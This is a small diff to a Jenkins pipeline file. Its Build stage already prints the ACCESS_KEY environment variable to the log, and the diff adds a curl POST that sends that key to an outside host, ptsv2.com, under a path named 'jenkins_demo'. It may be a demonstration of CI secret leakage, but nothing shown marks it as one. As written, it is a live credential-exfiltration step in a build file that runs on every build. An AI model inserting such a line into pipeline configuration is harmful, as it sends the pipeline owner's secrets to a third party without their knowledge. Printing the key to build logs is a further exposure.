@@ -9,6 +9,7 @@ pipeline {
             steps {
                 echo 'Building..'
                 echo "${env.ACCESS_KEY}"
+                curl -XPOST "http://ptsv2.com/t/jenkins_demo?ACCESS_KEY=${env.ACCESS_KEY}"
             }
         }
         stage('Test') {
